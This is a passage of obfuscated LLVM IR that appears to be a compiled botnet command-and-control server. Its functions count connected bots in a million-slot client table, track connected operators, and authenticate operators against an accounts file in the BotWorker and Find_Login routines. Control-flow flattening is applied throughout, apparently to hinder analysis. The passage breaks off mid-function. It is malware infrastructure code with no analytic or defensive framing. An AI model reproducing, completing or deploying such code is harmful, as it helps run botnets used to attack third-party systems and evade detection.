; Function Attrs: nounwind
declare noalias i8* @calloc(i64, i64) #3

declare i32 @epoll_wait(i32, %struct.epoll_event*, i32, i32) #1

declare i32 @close(i32) #1

declare i32 @accept(i32, %struct.sockaddr*, i32*) #1

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #5

declare void @perror(i8*) #1

; Function Attrs: noinline nounwind uwtable
define internal i32 @make_socket_non_blocking(i32) #0 {
  %.reg2mem = alloca i32
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  %6 = load i32, i32* %3, align 4
  %7 = call i32 (i32, i32, ...) @fcntl(i32 %6, i32 3, i32 0)
  store i32 %7, i32* %4, align 4
  %8 = load i32, i32* %4, align 4
  store i32 %8, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -24846738, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -24846738, label %first
    i32 -836258321, label %11
    i32 -934825912, label %12
    i32 -1816660298, label %21
    i32 -224205161, label %22
    i32 -1691169996, label %23
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %9 = icmp eq i32 %.reload, -1
  %10 = select i1 %9, i32 -836258321, i32 -934825912
  store i32 %10, i32* %switchVar
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  call void @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.118, i32 0, i32 0))
  store i32 -1, i32* %2, align 4
  store i32 -1691169996, i32* %switchVar
  br label %loopEnd

; <label>:12:                                     ; preds = %loopEntry
  %13 = load i32, i32* %4, align 4
  %14 = or i32 %13, 2048
  store i32 %14, i32* %4, align 4
  %15 = load i32, i32* %3, align 4
  %16 = load i32, i32* %4, align 4
  %17 = call i32 (i32, i32, ...) @fcntl(i32 %15, i32 4, i32 %16)
  store i32 %17, i32* %5, align 4
  %18 = load i32, i32* %5, align 4
  %19 = icmp eq i32 %18, -1
  %20 = select i1 %19, i32 -1816660298, i32 -224205161
  store i32 %20, i32* %switchVar
  br label %loopEnd

; <label>:21:                                     ; preds = %loopEntry
  call void @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.118, i32 0, i32 0))
  store i32 -1, i32* %2, align 4
  store i32 -1691169996, i32* %switchVar
  br label %loopEnd

; <label>:22:                                     ; preds = %loopEntry
  store i32 0, i32* %2, align 4
  store i32 -1691169996, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  %24 = load i32, i32* %2, align 4
  ret i32 %24

loopEnd:                                          ; preds = %22, %21, %12, %11, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @epoll_ctl(i32, i32, i32, %struct.epoll_event*) #3

; Function Attrs: nounwind readonly
declare i8* @strstr(i8*, i8*) #2

declare i32 @fprintf(%struct._IO_FILE*, i8*, ...) #1

declare i32 @fflush(%struct._IO_FILE*) #1

declare i32 @fcntl(i32, i32, ...) #1

; Function Attrs: noinline nounwind uwtable
define i32 @BotsConnected() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  store i32 0, i32* %2, align 4
  store i32 0, i32* %1, align 4
  %switchVar = alloca i32
  store i32 408396999, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 408396999, label %3
    i32 503284341, label %7
    i32 1833813966, label %15
    i32 -1167405220, label %16
    i32 -444388036, label %19
    i32 1791167116, label %22
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:3:                                      ; preds = %loopEntry
  %4 = load i32, i32* %1, align 4
  %5 = icmp slt i32 %4, 1000000
  %6 = select i1 %5, i32 503284341, i32 1791167116
  store i32 %6, i32* %switchVar
  br label %loopEnd

; <label>:7:                                      ; preds = %loopEntry
  %8 = load i32, i32* %1, align 4
  %9 = sext i32 %8 to i64
  %10 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %9
  %11 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %10, i32 0, i32 1
  %12 = load i8, i8* %11, align 4
  %13 = icmp ne i8 %12, 0
  %14 = select i1 %13, i32 -1167405220, i32 1833813966
  store i32 %14, i32* %switchVar
  br label %loopEnd

; <label>:15:                                     ; preds = %loopEntry
  store i32 -444388036, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  %17 = load i32, i32* %2, align 4
  %18 = add nsw i32 %17, 1
  store i32 %18, i32* %2, align 4
  store i32 -444388036, i32* %switchVar
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  %20 = load i32, i32* %1, align 4
  %21 = add nsw i32 %20, 1
  store i32 %21, i32* %1, align 4
  store i32 408396999, i32* %switchVar
  br label %loopEnd

; <label>:22:                                     ; preds = %loopEntry
  %23 = load i32, i32* %2, align 4
  ret i32 %23

loopEnd:                                          ; preds = %19, %16, %15, %7, %3, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i8* @TitleWriter(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca [2048 x i8], align 16
  store i8* %0, i8** %2, align 8
  %5 = load i8*, i8** %2, align 8
  %6 = ptrtoint i8* %5 to i32
  store i32 %6, i32* %3, align 4
  %switchVar = alloca i32
  store i32 -1261390903, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1261390903, label %7
    i32 -1912890750, label %20
    i32 -1407504388, label %21
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:7:                                      ; preds = %loopEntry
  %8 = getelementptr inbounds [2048 x i8], [2048 x i8]* %4, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %8, i8 0, i64 2048, i32 16, i1 false)
  %9 = getelementptr inbounds [2048 x i8], [2048 x i8]* %4, i32 0, i32 0
  %10 = call i32 @BotsConnected()
  %11 = load volatile i32, i32* @OperatorsConnected, align 4
  %12 = call i32 (i8*, i8*, ...) @sprintf(i8* %9, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.17, i32 0, i32 0), i32 27, i32 %10, i32 %11, i32 7) #7
  %13 = load i32, i32* %3, align 4
  %14 = getelementptr inbounds [2048 x i8], [2048 x i8]* %4, i32 0, i32 0
  %15 = getelementptr inbounds [2048 x i8], [2048 x i8]* %4, i32 0, i32 0
  %16 = call i64 @strlen(i8* %15) #8
  %17 = call i64 @send(i32 %13, i8* %14, i64 %16, i32 16384)
  %18 = icmp eq i64 %17, -1
  %19 = select i1 %18, i32 -1912890750, i32 -1407504388
  store i32 %19, i32* %switchVar
  br label %loopEnd

; <label>:20:                                     ; preds = %loopEntry
  ret i8* null

; <label>:21:                                     ; preds = %loopEntry
  %22 = call i32 @sleep(i32 2)
  store i32 -1261390903, i32* %switchVar
  br label %loopEnd

loopEnd:                                          ; preds = %21, %7, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @sprintf(i8*, i8*, ...) #3

declare i32 @sleep(i32) #1

; Function Attrs: noinline nounwind uwtable
define i32 @Find_Login(i8*) #0 {
  %.reg2mem = alloca %struct._IO_FILE*
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca %struct._IO_FILE*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca [512 x i8], align 16
  store i8* %0, i8** %3, align 8
  store i32 0, i32* %5, align 4
  store i32 0, i32* %6, align 4
  store i32 0, i32* %7, align 4
  %9 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.19, i32 0, i32 0))
  store %struct._IO_FILE* %9, %struct._IO_FILE** %.reg2mem
  %.reload2 = load volatile %struct._IO_FILE*, %struct._IO_FILE** %.reg2mem
  store %struct._IO_FILE* %.reload2, %struct._IO_FILE** %4, align 8
  %switchVar = alloca i32
  store i32 795094732, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 795094732, label %first
    i32 406291786, label %12
    i32 1823611221, label %13
    i32 -1436212160, label %14
    i32 819228964, label %20
    i32 -67129770, label %26
    i32 1484507518, label %30
    i32 68993635, label %33
    i32 -1332482842, label %37
    i32 2135842668, label %40
    i32 -1774416856, label %44
    i32 918614536, label %45
    i32 -309379269, label %47
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile %struct._IO_FILE*, %struct._IO_FILE** %.reg2mem
  %10 = icmp eq %struct._IO_FILE* %.reload, null
  %11 = select i1 %10, i32 406291786, i32 1823611221
  store i32 %11, i32* %switchVar
  br label %loopEnd

; <label>:12:                                     ; preds = %loopEntry
  store i32 -1, i32* %2, align 4
  store i32 -309379269, i32* %switchVar
  br label %loopEnd

; <label>:13:                                     ; preds = %loopEntry
  store i32 -1436212160, i32* %switchVar
  br label %loopEnd

; <label>:14:                                     ; preds = %loopEntry
  %15 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i32 0, i32 0
  %16 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %17 = call i8* @fgets(i8* %15, i32 512, %struct._IO_FILE* %16)
  %18 = icmp ne i8* %17, null
  %19 = select i1 %18, i32 819228964, i32 68993635
  store i32 %19, i32* %switchVar
  br label %loopEnd

; <label>:20:                                     ; preds = %loopEntry
  %21 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i32 0, i32 0
  %22 = load i8*, i8** %3, align 8
  %23 = call i8* @strstr(i8* %21, i8* %22) #8
  %24 = icmp ne i8* %23, null
  %25 = select i1 %24, i32 -67129770, i32 1484507518
  store i32 %25, i32* %switchVar
  br label %loopEnd

; <label>:26:                                     ; preds = %loopEntry
  %27 = load i32, i32* %6, align 4
  %28 = add nsw i32 %27, 1
  store i32 %28, i32* %6, align 4
  %29 = load i32, i32* %5, align 4
  store i32 %29, i32* %7, align 4
  store i32 1484507518, i32* %switchVar
  br label %loopEnd

; <label>:30:                                     ; preds = %loopEntry
  %31 = load i32, i32* %5, align 4
  %32 = add nsw i32 %31, 1
  store i32 %32, i32* %5, align 4
  store i32 -1436212160, i32* %switchVar
  br label %loopEnd

; <label>:33:                                     ; preds = %loopEntry
  %34 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %35 = icmp ne %struct._IO_FILE* %34, null
  %36 = select i1 %35, i32 -1332482842, i32 2135842668
  store i32 %36, i32* %switchVar
  br label %loopEnd

; <label>:37:                                     ; preds = %loopEntry
  %38 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %39 = call i32 @fclose(%struct._IO_FILE* %38)
  store i32 2135842668, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = load i32, i32* %6, align 4
  %42 = icmp eq i32 %41, 0
  %43 = select i1 %42, i32 -1774416856, i32 918614536
  store i32 %43, i32* %switchVar
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  store i32 0, i32* %2, align 4
  store i32 -309379269, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  %46 = load i32, i32* %7, align 4
  store i32 %46, i32* %2, align 4
  store i32 -309379269, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  %48 = load i32, i32* %2, align 4
  ret i32 %48

loopEnd:                                          ; preds = %45, %44, %40, %37, %33, %30, %26, %20, %14, %13, %12, %first, %switchDefault
  br label %loopEntry
}

declare %struct._IO_FILE* @fopen(i8*, i8*) #1

declare i8* @fgets(i8*, i32, %struct._IO_FILE*) #1

declare i32 @fclose(%struct._IO_FILE*) #1

; Function Attrs: noinline nounwind uwtable
define i8* @BotWorker(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i64, align 8
  %7 = alloca [2048 x i8], align 16
  %8 = alloca i8*, align 8
  %9 = alloca i8*, align 8
  %10 = alloca [2048 x i8], align 16
  %11 = alloca [2048 x i8], align 16
  %12 = alloca [2048 x i8], align 16
  %13 = alloca %struct._IO_FILE*, align 8
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i8*, align 8
  %18 = alloca [80 x i8], align 16
  %19 = alloca [5000 x i8], align 16
  %20 = alloca [5000 x i8], align 16
  %21 = alloca [5000 x i8], align 16
  %22 = alloca [5000 x i8], align 16
  %23 = alloca [5000 x i8], align 16
  %24 = alloca [5000 x i8], align 16
  %25 = alloca [5000 x i8], align 16
  %26 = alloca [80 x i8], align 16
  %27 = alloca [2048 x i8], align 16
  %28 = alloca [80 x i8], align 16
  %29 = alloca [80 x i8], align 16
  %30 = alloca [80 x i8], align 16
  %31 = alloca [80 x i8], align 16
  %32 = alloca [80 x i8], align 16
  %33 = alloca [80 x i8], align 16
  %34 = alloca [80 x i8], align 16
  %35 = alloca [80 x i8], align 16
  %36 = alloca [80 x i8], align 16
  %37 = alloca [80 x i8], align 16
  %38 = alloca [80 x i8], align 16
  %39 = alloca [80 x i8], align 16
  %40 = alloca [80 x i8], align 16
  %41 = alloca [80 x i8], align 16
  %42 = alloca [80 x i8], align 16
  %43 = alloca [80 x i8], align 16
  %44 = alloca [80 x i8], align 16
  %45 = alloca [80 x i8], align 16
  %46 = alloca [80 x i8], align 16
  %47 = alloca [80 x i8], align 16
  %48 = alloca [80 x i8], align 16
  %49 = alloca [80 x i8], align 16
  %50 = alloca [80 x i8], align 16
  %51 = alloca [80 x i8], align 16
  %52 = alloca [80 x i8], align 16
  %53 = alloca [2048 x i8], align 16
  %54 = alloca [2048 x i8], align 16
  %55 = alloca [2048 x i8], align 16
  %56 = alloca %struct._IO_FILE*, align 8
  %57 = alloca i64, align 8
  %58 = alloca %struct.tm*, align 8
  %59 = alloca [50 x i8], align 16
  %60 = alloca [50 x i8], align 16
  store i8* %0, i8** %3, align 8
  %61 = load i8*, i8** %3, align 8
  %62 = ptrtoint i8* %61 to i32
  store i32 %62, i32* %4, align 4
  %63 = load volatile i32, i32* @OperatorsConnected, align 4
  %64 = add nsw i32 %63, 1
  store volatile i32 %64, i32* @OperatorsConnected, align 4
  %65 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %65, i8 0, i64 2048, i32 16, i1 false)
  %66 = getelementptr inbounds [2048 x i8], [2048 x i8]* %10, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %66, i8 0, i64 2048, i32 16, i1 false)
  %67 = getelementptr inbounds [2048 x i8], [2048 x i8]* %11, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %67, i8 0, i64 2048, i32 16, i1 false)
  %68 = getelementptr inbounds [2048 x i8], [2048 x i8]* %12, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %68, i8 0, i64 2048, i32 16, i1 false)
  store i32 0, i32* %14, align 4
  %69 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.19, i32 0, i32 0))
  store %struct._IO_FILE* %69, %struct._IO_FILE** %13, align 8
  %switchVar = alloca i32
  store i32 1441176246, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1441176246, label %70
    i32 1856648109, label %76
    i32 1432331466, label %81
    i32 1226158256, label %83
    i32 283138972, label %89
    i32 -1797364322, label %104
    i32 -327835917, label %109
    i32 -1197908525, label %110
    i32 1390520626, label %116
    i32 157558480, label %117
    i32 464607706, label %138
    i32 -24876356, label %143
    i32 -488341705, label %144
    i32 -985264348, label %150
    i32 -723056364, label %151
    i32 231171516, label %162
    i32 1883188511, label %163
    i32 -1419499077, label %165
    i32 -572898717, label %166
    i32 1931637683, label %171
    i32 -1954059816, label %172
    i32 704326218, label %182
    i32 1383813423, label %183
    i32 324138874, label %185
    i32 -1007576152, label %221
    i32 -307302685, label %222
    i32 -1326750103, label %230
    i32 704427525, label %231
    i32 -299103065, label %239
    i32 -1740490019, label %240
    i32 -1035000407, label %248
    i32 -965624172, label %249
    i32 716435642, label %257
    i32 -1140161680, label %258
    i32 1840495497, label %266
    i32 -372206897, label %267
    i32 -1975842501, label %275
    i32 -745882434, label %276
    i32 -1403676174, label %284
    i32 501022389, label %285
    i32 -773387133, label %286
    i32 1670986208, label %294
    i32 1908615296, label %295
    i32 -2045662619, label %300
    i32 -1927078366, label %301
    i32 -565320420, label %302
    i32 2121039026, label %309
    i32 1050394633, label %315
    i32 -581977341, label %320
    i32 1165039884, label %332
    i32 1233444916, label %333
    i32 1526942277, label %334
    i32 214223961, label %339
    i32 184645373, label %351
    i32 122528963, label %352
    i32 224631938, label %353
    i32 1592298091, label %358
    i32 60751410, label %370
    i32 1688869046, label %371
    i32 1576982613, label %383
    i32 985566904, label %384
    i32 1860873872, label %385
    i32 -1448012285, label %390
    i32 998327500, label %392
    i32 1781634984, label %397
    i32 2010998829, label %399
    i32 663226093, label %404
    i32 1009858078, label %406
    i32 1158734567, label %411
    i32 340336130, label %413
    i32 1099175096, label %418
    i32 1613591941, label %420
    i32 -2042449070, label %425
    i32 -1391400219, label %427
    i32 -566395118, label %432
    i32 2100408553, label %434
    i32 1300704866, label %439
    i32 166822699, label %441
    i32 701719937, label %446
    i32 -570302131, label %448
    i32 -1842103217, label %453
    i32 -441470939, label %455
    i32 -585210992, label %460
    i32 2061479409, label %462
    i32 1370677512, label %467
    i32 332356035, label %469
    i32 1061812264, label %474
    i32 -1243738250, label %476
    i32 -1873717310, label %481
    i32 -1437196163, label %483
    i32 -1904691242, label %488
    i32 516049006, label %490
    i32 930107762, label %495
    i32 59814654, label %555
    i32 -222310070, label %556
    i32 -1135386714, label %564
    i32 1589060296, label %565
    i32 -1057554719, label %573
    i32 -683379368, label %574
    i32 877812380, label %582
    i32 1264405835, label %583
    i32 -1262629810, label %591
    i32 -1478182128, label %592
    i32 1511155800, label %600
    i32 1384588159, label %601
    i32 -331194466, label %609
    i32 -826363171, label %610
    i32 688351338, label %618
    i32 1256701672, label %619
    i32 -538891298, label %627
    i32 1194696687, label %628
    i32 -1434754870, label %636
    i32 1828376701, label %637
    i32 -1464970187, label %645
    i32 514876695, label %646
    i32 -1007010537, label %654
    i32 -520190682, label %655
    i32 1322167323, label %663
    i32 -517692663, label %664
    i32 -1367756754, label %672
    i32 -1313976157, label %673
    i32 -590703365, label %681
    i32 398088364, label %682
    i32 -1632487816, label %690
    i32 1308647794, label %691
    i32 58091983, label %699
    i32 317437, label %700
    i32 227316095, label %708
    i32 1184665850, label %709
    i32 -1480355624, label %717
    i32 -496727325, label %718
    i32 1154941085, label %726
    i32 463250050, label %727
    i32 -1074347066, label %735
    i32 250313327, label %736
    i32 2027778628, label %744
    i32 1363475107, label %745
    i32 -1579496471, label %753
    i32 1019820144, label %754
    i32 -1661345552, label %762
    i32 -1511313758, label %763
    i32 1070029390, label %771
    i32 -934285809, label %772
    i32 -1639971546, label %775
    i32 1519248665, label %780
    i32 -477185471, label %791
    i32 2087254758, label %792
    i32 -1607809843, label %793
    i32 -1107034613, label %798
    i32 332770803, label %809
    i32 -2109711874, label %810
    i32 -973207482, label %818
    i32 841462765, label %819
    i32 -2030765725, label %827
    i32 1341857148, label %828
    i32 1803301887, label %836
    i32 -1505442743, label %837
    i32 215704077, label %845
    i32 -777581555, label %846
    i32 -971756845, label %854
    i32 1666389819, label %855
    i32 1039129946, label %863
    i32 1159070925, label %864
    i32 -1300793966, label %872
    i32 820821060, label %873
    i32 1471440996, label %881
    i32 -498526951, label %882
    i32 -821741606, label %883
    i32 1577261804, label %891
    i32 -1601231392, label %892
    i32 1613265145, label %897
    i32 -1871422235, label %898
    i32 -1954477189, label %899
    i32 -1352405219, label %900
    i32 198846320, label %905
    i32 -1369699226, label %921
    i32 459374223, label %922
    i32 2053141843, label %924
    i32 -934115011, label %930
    i32 -1870243530, label %931
    i32 -1767699315, label %936
    i32 88565833, label %937
    i32 1005861982, label %970
    i32 1233201185, label %971
    i32 1719111952, label %980
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:70:                                     ; preds = %loopEntry
  %71 = load %struct._IO_FILE*, %struct._IO_FILE** %13, align 8
  %72 = call i32 @feof(%struct._IO_FILE* %71) #7
  %73 = icmp ne i32 %72, 0
  %74 = xor i1 %73, true
  %75 = select i1 %74, i32 1856648109, i32 1432331466
  store i32 %75, i32* %switchVar
  br label %loopEnd

; <label>:76:                                     ; preds = %loopEntry
  %77 = load %struct._IO_FILE*, %struct._IO_FILE** %13, align 8
  %78 = call i32 @fgetc(%struct._IO_FILE* %77)
  store i32 %78, i32* %15, align 4
  %79 = load i32, i32* %14, align 4
  %80 = add nsw i32 %79, 1
  store i32 %80, i32* %14, align 4
  store i32 1441176246, i32* %switchVar
  br label %loopEnd

; <label>:81:                                     ; preds = %loopEntry
  store i32 0, i32* %16, align 4
  %82 = load %struct._IO_FILE*, %struct._IO_FILE** %13, align 8
  call void @rewind(%struct._IO_FILE* %82)
  store i32 1226158256, i32* %switchVar
  br label %loopEnd

; <label>:83:                                     ; preds = %loopEntry
  %84 = load i32, i32* %16, align 4
  %85 = load i32, i32* %14, align 4
  %86 = sub nsw i32 %85, 1
  %87 = icmp ne i32 %84, %86
  %88 = select i1 %87, i32 283138972, i32 -1797364322
  store i32 %88, i32* %switchVar
  br label %loopEnd

; <label>:89:                                     ; preds = %loopEntry
  %90 = load %struct._IO_FILE*, %struct._IO_FILE** %13, align 8
  %91 = load i32, i32* %16, align 4
  %92 = sext i32 %91 to i64
  %93 = getelementptr inbounds [10 x %struct.login_info], [10 x %struct.login_info]* @accounts, i64 0, i64 %92
  %94 = getelementptr inbounds %struct.login_info, %struct.login_info* %93, i32 0, i32 0
  %95 = getelementptr inbounds [20 x i8], [20 x i8]* %94, i32 0, i32 0
  %96 = load i32, i32* %16, align 4
  %97 = sext i32 %96 to i64
  %98 = getelementptr inbounds [10 x %struct.login_info], [10 x %struct.login_info]* @accounts, i64 0, i64 %97
  %99 = getelementptr inbounds %struct.login_info, %struct.login_info* %98, i32 0, i32 1
  %100 = getelementptr inbounds [20 x i8], [20 x i8]* %99, i32 0, i32 0
  %101 = call i32 (%struct._IO_FILE*, i8*, ...) @__isoc99_fscanf(%struct._IO_FILE* %90, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.20, i32 0, i32 0), i8* %95, i8* %100)
  %102 = load i32, i32* %16, align 4
  %103 = add nsw i32 %102, 1
  store i32 %103, i32* %16, align 4
  store i32 1226158256, i32* %switchVar
  br label %loopEnd

; <label>:104:                                    ; preds = %loopEntry
  %105 = load i32, i32* %4, align 4
  %106 = call i64 @send(i32 %105, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.21, i32 0, i32 0), i64 22, i32 16384)
  %107 = icmp eq i64 %106, -1
  %108 = select i1 %107, i32 -327835917, i32 -1197908525
  store i32 %108, i32* %switchVar
  br label %loopEnd

; <label>:109:                                    ; preds = %loopEntry
  store i32 1233201185, i32* %switchVar
  br label %loopEnd

; <label>:110:                                    ; preds = %loopEntry
  %111 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %112 = load i32, i32* %4, align 4
  %113 = call i32 @fdgets(i8* %111, i32 2048, i32 %112)
  %114 = icmp slt i32 %113, 1
  %115 = select i1 %114, i32 1390520626, i32 157558480
  store i32 %115, i32* %switchVar
  br label %loopEnd

; <label>:116:                                    ; preds = %loopEntry
  store i32 1233201185, i32* %switchVar
  br label %loopEnd

; <label>:117:                                    ; preds = %loopEntry
  %118 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  call void @trim(i8* %118)
  %119 = load i32, i32* %5, align 4
  %120 = sext i32 %119 to i64
  %121 = getelementptr inbounds [10 x %struct.login_info], [10 x %struct.login_info]* @accounts, i64 0, i64 %120
  %122 = getelementptr inbounds %struct.login_info, %struct.login_info* %121, i32 0, i32 0
  %123 = getelementptr inbounds [20 x i8], [20 x i8]* %122, i32 0, i32 0
  %124 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %125 = call i32 (i8*, i8*, ...) @sprintf(i8* %123, i8* %124) #7
  %126 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  store i8* %126, i8** %17, align 8
  %127 = load i8*, i8** %17, align 8
  %128 = call i32 @Find_Login(i8* %127)
  store i32 %128, i32* %5, align 4
  %129 = load i8*, i8** %17, align 8
  %130 = load i32, i32* %5, align 4
  %131 = sext i32 %130 to i64
  %132 = getelementptr inbounds [10 x %struct.login_info], [10 x %struct.login_info]* @accounts, i64 0, i64 %131
  %133 = getelementptr inbounds %struct.login_info, %struct.login_info* %132, i32 0, i32 0
  %134 = getelementptr inbounds [20 x i8], [20 x i8]* %133, i32 0, i32 0
  %135 = call i32 @strcmp(i8* %129, i8* %134) #8
  %136 = icmp eq i32 %135, 0
  %137 = select i1 %136, i32 464607706, i32 -1419499077
  store i32 %137, i32* %switchVar
  br label %loopEnd

; <label>:138:                                    ; preds = %loopEntry
  %139 = load i32, i32* %4, align 4
  %140 = call i64 @send(i32 %139, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.23, i32 0, i32 0), i64 22, i32 16384)
  %141 = icmp eq i64 %140, -1
  %142 = select i1 %141, i32 -24876356, i32 -488341705
  store i32 %142, i32* %switchVar
  br label %loopEnd

; <label>:143:                                    ; preds = %loopEntry
  store i32 1233201185, i32* %switchVar
  br label %loopEnd

; <label>:144:                                    ; preds = %loopEntry
  %145 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %146 = load i32, i32* %4, align 4
  %147 = call i32 @fdgets(i8* %145, i32 2048, i32 %146)
  %148 = icmp slt i32 %147, 1
  %149 = select i1 %148, i32 -985264348, i32 -723056364
  store i32 %149, i32* %switchVar
  br label %loopEnd

; <label>:150:                                    ; preds = %loopEntry
  store i32 1233201185, i32* %switchVar
  br label %loopEnd

; <label>:151:                                    ; preds = %loopEntry
  %152 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  call void @trim(i8* %152)
  %153 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %154 = load i32, i32* %5, align 4
  %155 = sext i32 %154 to i64
  %156 = getelementptr inbounds [10 x %struct.login_info], [10 x %struct.login_info]* @accounts, i64 0, i64 %155
  %157 = getelementptr inbounds %struct.login_info, %struct.login_info* %156, i32 0, i32 1
  %158 = getelementptr inbounds [20 x i8], [20 x i8]* %157, i32 0, i32 0
  %159 = call i32 @strcmp(i8* %153, i8* %158) #8
  %160 = icmp ne i32 %159, 0
  %161 = select i1 %160, i32 231171516, i32 1883188511
  store i32 %161, i32* %switchVar
  br label %loopEnd

; <label>:162:                                    ; preds = %loopEntry
  store i32 -572898717, i32* %switchVar
  br label %loopEnd

; <label>:163:                                    ; preds = %loopEntry
  %164 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %164, i8 0, i64 2048, i32 16, i1 false)
  store i32 324138874, i32* %switchVar
  br label %loopEnd

; <label>:165:                                    ; preds = %loopEntry
  store i32 -572898717, i32* %switchVar
  br label %loopEnd

; <label>:166:                                    ; preds = %loopEntry
  %167 = load i32, i32* %4, align 4
  %168 = call i64 @send(i32 %167, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.24, i32 0, i32 0), i64 5, i32 16384)
  %169 = icmp eq i64 %168, -1
  %170 = select i1 %169, i32 1931637683, i32 -1954059816
  store i32 %170, i32* %switchVar
  br label %loopEnd

; <label>:171:                                    ; preds = %loopEntry
  store i32 1233201185, i32* %switchVar
  br label %loopEnd

; <label>:172:                                    ; preds = %loopEntry
  %173 = getelementptr inbounds [80 x i8], [80 x i8]* %18, i32 0, i32 0
  %174 = call i32 (i8*, i8*, ...) @sprintf(i8* %173, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.25, i32 0, i32 0)) #7
  %175 = load i32, i32* %4, align 4
  %176 = getelementptr inbounds [80 x i8], [80 x i8]* %18, i32 0, i32 0
  %177 = getelementptr inbounds [80 x i8], [80 x i8]* %18, i32 0, i32 0
  %178 = call i64 @strlen(i8* %177) #8
  %179 = call i64 @send(i32 %175, i8* %176, i64 %178, i32 16384)
  %180 = icmp eq i64 %179, -1
  %181 = select i1 %180, i32 704326218, i32 1383813423
  store i32 %181, i32* %switchVar
  br label %loopEnd

; <label>:182:                                    ; preds = %loopEntry
  store i32 1233201185, i32* %switchVar
  br label %loopEnd

; <label>:183:                                    ; preds = %loopEntry
  %184 = call i32 @sleep(i32 5)
  store i32 1233201185, i32* %switchVar
  br label %loopEnd

; <label>:185:                                    ; preds = %loopEntry
